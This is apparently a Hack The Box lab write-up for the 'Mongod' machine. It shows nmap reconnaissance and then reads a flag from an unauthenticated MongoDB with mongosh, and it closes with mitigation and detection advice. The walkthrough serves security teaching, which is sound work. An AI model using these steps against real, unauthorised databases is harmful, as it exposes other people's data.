---
machine: Mongod
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
tags: [linux, mongodb, no-auth, database]
---

# Mongod — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available (Starting Point), publishable.
> Reference notes. No real flags or credentials.

## TL;DR

**MongoDB listening on 27017 with no authentication**. Connect with `mongosh`, list the databases, open the telltale one and read the `flag` collection. One step, no exploits.

## Recon

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

```text
22/tcp      ssh     OpenSSH
27017/tcp   mongodb MongoDB 3.6.8
```

`nmap -p27017 --script mongodb-info <IP>` confirms the version and that no credentials are required.

## Access

```bash
mongosh --host <IP> --port 27017
# older installs: mongo <IP>:27017
```

```text
> show dbs
admin                 0.000GB
config                0.000GB
local                 0.000GB
sensitive_information 0.000GB

> use sensitive_information
> show collections
flag
users

> db.flag.find().pretty()
{ "_id" : ObjectId("..."), "flag" : "<flag>" }
```

A GUI client (Compass) follows the same path: connect with no user or password and browse.

## Evidence (redacted)

```text
sensitive_information.flag  ->  <flag>
```

## Lessons

- MongoDB without `--auth` bound to `0.0.0.0` hands the whole database to anyone who reaches the port.
- Even with auth, a `readAnyDatabase` role reads everything: the permission model matters.
- Mitigation: `security.authorization: enabled`, `bindIp` limited to localhost or the internal network, TLS, and per-application users with least privilege.
- Detection: 27017 connections from outside the cluster and unusual `listDatabases` calls.
